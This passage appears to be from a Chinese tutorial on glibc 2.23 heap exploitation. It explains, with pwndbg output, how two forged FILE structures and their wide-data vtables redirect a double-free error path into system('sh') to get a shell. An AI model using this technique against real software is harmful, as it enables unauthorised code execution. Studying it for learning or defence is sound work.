  vtable = 0x731c74b8bfb0
}
pwndbg> p/x *(struct _IO_jump_t*)0x731c74b8bfb0
$2 = {
  __dummy = 0x731c7486d997,
  __dummy2 = 0x731c7486d8f5,
  __finish = 0x731c7486dba8,
  __overflow = 0x731c74865787,
  __underflow = 0x731c7486e477,
  __uflow = 0x731c7486e47f,
  __pbackfail = 0x731c7486e469,
  __xsputn = 0x731c7486dba8,
  __xsgetn = 0x731c7486e471,
  __seekoff = 0x731c7486e485,
  __seekpos = 0x731c7486e48b,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x731c748661d5,
  __close = 0x731c74865d8c,
  __stat = 0x731c74865d2d,
  __showmanyc = 0x731c748655fa,
  __imbue = 0x731c748661b6
}
pwndbg> p/x &_IO_wdefault_doallocate
$3 = 0x731c74865787
pwndbg> p/x *(struct _IO_wide_data*)0x629dfb14eb40
$4 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x629dfb14ebf8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x629dfb14ebf8
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x629dfb14ec38
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x629dfb14ec38
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg>
```

在可控的堆内存区域（例如`chunk[3]`内），需要构造 **第二级伪造的`_IO_FILE_plus`结构**。此结构是引导控制流抵达最终恶意函数（如`system`）的核心载体，其每一个字段都经过精密计算，旨在完美通过glibc IO层的一系列状态校验。

**关键字段的伪造与作用原理如下：**

1.  **`_flags`字段：通过模式校验**  
    将此字段设置为`b”\x01\x08||sh\x00\x00″`（即`0x0068737c7c0801`）。该值的比特位模式经过专门设计，使得`_IO_in_put_mode (fp)`宏的评估结果为真。这确保执行流在后续步骤中能够被识别为处于“输入模式”，从而顺利进入关键的 **`_IO_switch_to_wget_mode (fp)`** 函数，这是切换流状态并触发目标虚表调用的必经之路。

2.  **虚表（`vtable`）指针：设定执行起点**  
    将`vtable`指针设置为 **`_IO_wstrn_jumps + 0x28`**。此偏移经过精确计算，使得该结构体中的`_IO_OVERFLOW`函数指针实际指向跳转表中的 **`_IO_wdefault_xsgetn`** 函数。该函数负责处理宽字符流的输入请求，成为我们将控制流引入预设的“下溢”（underflow）处理路径的起始点。

3.  **`_wide_data`指针：指向最终利用载荷**  
    将此指针指向`chunk0_addr + 0x30`。该地址指向一个完全可控的、伪造的`_IO_wide_data`结构体。**这是整个利用链的终点**，因为在该结构体中，可以进一步控制其虚表（`_wide_vtable`），并将`_wide_vtable`中的`__overflow`函数项设置为最终的利用目标地址（例如`system`）。

4.  **关键状态字段：满足条件触发最终调用**  
    *   **`_mode`字段**：将其设置为`1`。这表示该流具有面向宽字符的定向，有助于通过一些内部的状态一致性检查。
    *   **`_IO_write_ptr`与`_IO_write_base`字段**：在`_wide_data`所指向的结构中，将`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`。  
    *   **核心目的**：以上设置的组合，特别是`_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`的条件，用于满足 **`_IO_flush_all_lockp`** 函数中的一个关键判断。当此条件成立时，**会继续调用该文件流的`_IO_OVERFLOW`函数**（即`_IO_wdefault_xsgetn`），从而将控制流无缝导向我们预设的`_IO_wdefault_xsgetn`函数。

**小结**：此阶段通过原子级精确地伪造第二级`_IO_FILE_plus`结构的各个字段，构建了一条从IO状态验证、虚表跳转到最终触发可控函数指针的完整逻辑链。每一个值都旨在欺骗并顺利通过glibc复杂的IO状态机检查，最终将一次看似正常的缓冲区刷新操作，转化为对任意地址的代码执行。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)0x629dfb14ed60
$8 = {
  file = {
    _flags = 0x7c7c0801,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x629dfb14e030,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x1,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x731c74b8bf88
}
pwndbg> p/x *(struct _IO_jump_t*)0x731c74b8bf88
$9 = {
  __dummy = 0x731c748655fa,
  __dummy2 = 0x731c748661b6,
  __finish = 0x731c7486565d,
  __overflow = 0x731c74865a90,
  __underflow = 0x731c7486630a,
  __uflow = 0x731c7486d997,
  __pbackfail = 0x731c7486d8f5,
  __xsputn = 0x731c7486dba8,
  __xsgetn = 0x731c74865787,
  __seekoff = 0x731c7486e477,
  __seekpos = 0x731c7486e47f,
  __setbuf = 0x731c7486e469,
  __sync = 0x731c7486dba8,
  __doallocate = 0x731c7486e471,
  __read = 0x731c7486e485,
  __write = 0x731c7486e48b,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> p/x &_IO_wdefault_xsgetn
$10 = 0x731c74865a90
pwndbg> x/s 0x629dfb14ed60
0x629dfb14ed60: "\001\b||sh"
pwndbg> 
```

在可控的堆内存（例如`chunk[0]`）中，需要为第二级伪造的`_IO_FILE_plus`结构精心构造其关联的 **`_IO_wide_data`** 结构。此结构的布局是整个利用链的终点，其目标是精确引导控制流，最终触发对`system`函数的调用。

**具体的内存伪造与路径控制如下：**

1.  **设置`_wide_vtable`并植入最终目标**：
    *   将`_wide_vtable`指针设置为`chunk0_addr + 0x200`，指向一个完全可控的伪造虚表区域。
    *   在该伪造的`_wide_vtable`中，将其 **`__overflow`** 函数指针项设置为`system`函数的地址。这是整个利用链的最终执行目标。

2.  **控制`_IO_read_ptr`与`_IO_read_end`以引导至`__wunderflow`**：
    *   将`_IO_wide_data`结构中的`_IO_read_ptr`和`_IO_read_end`字段均设置为`0`。
    *   此设置的**核心作用**在于，当后续`_IO_wdefault_xsgetn`函数计算 `count = fp->_wide_data->_IO_read_end - fp->_wide_data->_IO_read_ptr` 时，`count`的值将为`0`。这使得条件判断 `if (count > 0)` 不成立，从而绕过从现有缓冲区读取的快速路径，转而进入关键的 `if (more == 0 || __wunderflow (fp) == WEOF)` 分支。

3.  **利用第一级结构的结果满足`more != 0`条件**：
    *   如前所述，第一级伪造结构通过`_IO_wsetb`成功将`rdx`寄存器设置为一个非零值，而`more`变量的值正来源于`rdx`。
    *   因此，条件 `more == 0` 不成立，执行流**必然进入`__wunderflow (fp)`调用**，这是从`_IO_wdefault_xsgetn`通向`_IO_switch_to_wget_mode`的唯一路径。

4.  **设置`_mode`与`_flags`以通过`_IO_switch_to_wget_mode`的检查**：
    *   第二级`_IO_FILE`结构的`_mode`字段已设为`0`。这使其成功绕过了`__wunderflow`中的 `if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))` 检查。
    *   其`_flags`字段为`0x801`。此值经过精心设计，使得 `_IO_in_put_mode (fp)` 宏的评估结果为真，从而确保执行流能够顺利进入 **`_IO_switch_to_wget_mode (fp)`** 函数。

5.  **设置`_IO_write_ptr`与`_IO_write_base`以触发最终调用**：
    *   在`_IO_wide_data`结构中，将`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`。
    *   此设置的**决定性作用**在于，当`_IO_switch_to_wget_mode`函数执行到判断 `if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)` 时，条件成立（`3 > 2`）。这使得该函数不会提前返回，而是继续调用该文件流的 **`_IO_WOVERFLOW`** 宏。

**最终触发**：`_IO_WOVERFLOW`宏展开后，即调用我们预先设置在伪造`_wide_vtable`中的`__overflow`函数指针，也就是`system`函数。至此，从复杂的IO状态机中成功“逃脱”，实现了任意代码执行。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x629dfb14e030
$11 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x2,
  _IO_write_ptr = 0x3,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x629dfb14e0e8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x629dfb14e0e8
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x629dfb14e128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x629dfb14e128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x629dfb14e200
}
pwndbg> p/x *(struct _IO_jump_t*)0x629dfb14e200
$12 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x0,
  __overflow = 0x731c7483c3eb,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/5i 0x731c7483c3eb
   0x731c7483c3eb <__libc_system>:      sub    rsp,0x8
   0x731c7483c3ef <__libc_system+4>:    test   rdi,rdi
   0x731c7483c3f2 <__libc_system+7>:    jne    0x731c7483c40a <__libc_system+31>
   0x731c7483c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x731c74956d7b
   0x731c7483c3fb <__libc_system+16>:   call   0x731c7483be36 <do_system>
pwndbg> 
```

整个利用链的启动，始于主动触发一个堆分配错误。具体而言，**再次释放**已位于large bin中的`chunk[0]`，会立即被glibc的`_int_free`函数检测为**双重释放**。该错误会触发对 **`malloc_printerr`** 函数的调用，从而进入错误处理流程。

`malloc_printerr`在准备打印错误信息时，会调用 **`_IO_flush_all_lockp`** 函数来刷新所有已打开的IO流。此函数会遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已将该指针劫持为`chunk[2]`的地址，因此遍历直接从我们伪造的第一级IO结构开始。

当执行流抵达`chunk[2]`上伪造的`_IO_FILE_plus`结构时，IO层会对其进行一系列状态检查。得益于预先对`_flags`等字段的精心设置，该伪造结构通过了校验，被识别为一个需要刷新缓冲区的有效文件流。

这一判定导致通过该结构的虚表调用其 **`_IO_OVERFLOW`** 函数。由于我们已将虚表设置为 **`_IO_wstrn_jumps`**，实际执行的是其中的 **`_IO_wdefault_doallocate`** 函数。

**此步骤的核心目标**：`_IO_wdefault_doallocate`的执行（及其内部对`_IO_wsetb`的调用）会操作我们通过`_wide_data`指针预设的伪造结构，最终达成一个至关重要的硬件状态改变：**将`rdx`寄存器的值设置为一个非零值**。这为后续判断`more != 0`、从而使执行流得以通过`_chain`指针进入第二级伪造结构，而非提前返回，创造了决定性的条件。至此，利用链成功启动，并为进入更复杂的第二阶段做好了准备。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x731c7486de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wdefault_doallocate>
        rdi: 0x629dfb14e940 ◂— 0
        
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:406
   400 {
   401   wchar_t *buf;
   402 
   403   buf = malloc (_IO_BUFSIZ);
   404   if (__glibc_unlikely (buf == NULL))
   405     return EOF;
 ► 406   _IO_wsetb (fp, buf, buf + _IO_BUFSIZ, 1);
 
 ► 0x731c748657ac <_IO_wdefault_doallocate+37>    call   _IO_wsetb                   <_IO_wsetb>
        rdi: 0x629dfb14e940 ◂— 0
        rsi: 0x731c700008c0 ◂— 0
        rdx: 0x731c700088c0 ◂— 0
        rcx: 1

In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:113
   107   f->_wide_data->_IO_buf_base = b;
   108   f->_wide_data->_IO_buf_end = eb;
   109   if (a)
   110     f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
   111   else
   112     f->_flags2 |= _IO_FLAGS2_USER_WBUF;
 ► 113 }
   114 libc_hidden_def (_IO_wsetb)
   
pwndbg> p/x $rdx
$14 = 0x731c700088c0
pwndbg> 
```

在成功通过第一级伪造的`_IO_FILE_plus`结构及其`_IO_wdefault_doallocate`函数，将`rdx`寄存器设置为一个非零值（例如`0x731c700088c0`）后，利用链进入了关键的过渡阶段。

由于第一级结构中`_chain`指针已指向第二级伪造结构，执行流随之无缝跳转。此时，IO层将继续对链表中的下一个“文件流”（即第二级伪造结构）调用其`_IO_OVERFLOW`函数。由于该结构的虚表同样指向`_IO_wstrn_jumps`，实际执行的是其中的 **`_IO_wdefault_xsgetn`** 函数。

**至关重要的状态传递**：在此函数调用发生时，**之前由第一级结构所设置的`rdx`寄存器值（`0x731c700088c0`）被作为`more`参数完整地传递了进来**。这个非零的`more`值是此前精心布局的成果，它使得函数内部的判断`if (more == 0 ...)`条件不成立，从而强制引导执行流进入后续的`__wunderflow (fp)`调用路径，而不是提前返回。这标志着利用成功跨越了第一级与第二级结构之间的逻辑桥梁，正式启动了最终阶段的利用代码。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x731c7486de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wdefault_xsgetn>
        rdi: 0x629dfb14ed60 ◂— 0x68737c7c0801
        rsi: 0xffffffff
        rdx: 0x731c700088c0 ◂— 0
```

当执行流进入 **`_IO_wdefault_xsgetn`** 函数后，函数内部首先会计算当前宽字符输入缓冲区中剩余的可读数据量，其核心判断为 `if (count > 0)`，其中 `count = fp->_wide_data->_IO_read_end - fp->_wide_data->_IO_read_ptr`。

由于我们在伪造第二级`_IO_FILE_plus`结构时，已将其`_wide_data`指针所指向的伪造`_IO_wide_data`结构中的 **`_IO_read_ptr`和`_IO_read_end`字段均预设为`0`**，因此此处的`count`计算结果为`0`。这使得条件 `if (count > 0)` 不成立，执行流**无法进入直接从现有缓冲区读取数据的快速路径**，从而转向处理缓冲区为空的逻辑。

随后，函数检查 `if (more == 0 || __wunderflow (fp) == WEOF)`。此时，得益于第一级伪造结构（`_IO_wdefault_doallocate`）的执行成果，传递进来的`more`参数（来源于`rdx`寄存器）为一个 **非零值**（例如`0x731c700088c0`）。因此，`more == 0`的条件不成立，程序**必须尝试调用`__wunderflow (fp)`来补充缓冲区数据**。

至此，通过前期精确的字段布局（`_IO_read_ptr`与`_IO_read_end`设为0）与状态传递（`more`设为非0），我们成功地引导控制流绕过了`if (count > 0)`的检查，并强制其进入关键的 **`__wunderflow`** 函数调用路径。这是将IO流内部读取逻辑，转化为我们预设的恶意执行链（`__wunderflow` -> `_IO_switch_to_wget_mode` -> ...）的又一个决定性步骤。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:376
   370               while (--i >= 0)
   371                 *s++ = *p++;
   372               fp->_wide_data->_IO_read_ptr = p;
   373             }
   374             more -= count;
   375         }
 ► 376       if (more == 0 || __wunderflow (fp) == WEOF)
 
 ► 0x731c74865b27 <_IO_wdefault_xsgetn+151>    call   __wunderflow                <__wunderflow>
        rdi: 0x629dfb14ed60 ◂— 0x68737c7c0801
```

在 **`__wunderflow`** 函数的执行路径上，存在数道严格的“关卡”，用以验证文件流的合法性。通过对第二级伪造`_IO_FILE_plus`结构的**字节级精确构造**，成功地引导执行流通过了所有验证，将看似严密的防御机制转化为预定的利用通道。

**1. 精准设定`_mode`，绕过初始定向校验**
函数首要的验证是 `if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))`，其目的在于确认当前流是一个有效的宽字符流。我们的伪造结构将`_mode`字段明确设置为`1`。此设定产生了双重效果：
*   首先，`fp->_mode < 0` 的条件**不成立**。
*   接着，由于`_mode`值为1，`fp->_mode == 0` 的判断也**不成立**。
因此，整个复合条件判断的**结果为假**，执行流**干净利落地绕过了这第一道也是最关键的校验**，无需依赖更复杂的`_IO_fwide`内部状态，极大地简化了利用条件。

**2. 精心设计`_flags`，满足“输入模式”状态**
随后，函数通过`_IO_in_put_mode (fp)`宏检查流是否处于“输入模式”。我们将`_flags`字段设置为`0x801`（对应字节序列`b”\x01\x08||sh\x00\x00″`）。该数值中特定的比特位组合，使得`_IO_in_put_mode`宏的评估结果为**真**。这标志伪造流被成功识别为处于活跃的输入状态，满足了进入后续关键操作的先决条件。

在连续突破上述两道核心校验后，执行流不再有任何阻碍，顺利调用 **`_IO_switch_to_wget_mode (fp)`** 函数。此调用标志着控制流正式完成了从处理“下溢”异常到主动切换到“获取”模式的转变，是脱离glibc IO内部复杂状态机、直线通向最终预设的恶意函数调用（`_wide_vtable->__overflow`）的最后一道关键枢纽。至此，整个利用链已突破所有主要逻辑验证，进入最终的触发执行阶段。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:270
   264   if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))
   265     return WEOF;
   266 
   267   if (fp->_mode == 0)
   268     _IO_fwide (fp, 1);
   269   if (_IO_in_put_mode (fp))
 ► 270     if (_IO_switch_to_wget_mode (fp) == EOF)
 
 ► 0x731c748659f1 <__wunderflow+74>    call   _IO_switch_to_wget_mode     <_IO_switch_to_wget_mode>
        rdi: 0x629dfb14ed60 ◂— 0x68737c7c0801
```

当执行流进入 **`_IO_switch_to_wget_mode`** 函数后，利用进入了最终也是最关键的检查点。函数内部会验证宽字符输出缓冲区状态，具体条件为 `if (fp->_wide_data->_IO_write_ptr > fp->__wide_data->_IO_write_base)`。

由于前期在伪造的`_IO_wide_data`结构中将 **`_IO_write_ptr`** 设为`3`， **`_IO_write_base`** 设为`2`，该比较条件（`3 > 2`）**明确成立**。这一成功满足的条件，使得执行流不会提前返回，而是继续执行，调用 **`_IO_WOVERFLOW (fp, WEOF)`** 宏。

`_IO_WOVERFLOW`宏的本质，是调用`_IO_wide_data`结构关联的虚表（`_wide_vtable`）中的 **`__overflow`** 函数指针。此前已完全控制此虚表，并将`__overflow`项预先设置为 **`system`函数的地址**。同时，在伪造的`_IO_FILE_plus`结构的`_flags`字段中，已提前嵌入了字符串`“sh”`作为参数。

因此，对`_IO_WOVERFLOW`的调用，即刻转化为对 **`system(“/bin/sh”)`** 的调用。至此，整个从堆内存布局、信息泄露、Large Bin Attack劫持全局指针、精心伪造两级IO结构，到引导复杂的glibc IO内部函数链的漫长而精密的利用过程宣告完成，成功**获取了目标系统的shell控制权**。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:416
   410 
   411 
   412 int
   413 _IO_switch_to_wget_mode (_IO_FILE *fp)
   414 {
   415   if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
 ► 416     if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
 
 ► 0x731c748657e0 <_IO_switch_to_wget_mode+33>    call   qword ptr [rax + 0x18]      <system>
        command: 0x629dfb14ed60 ◂— 0x68737c7c0801
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
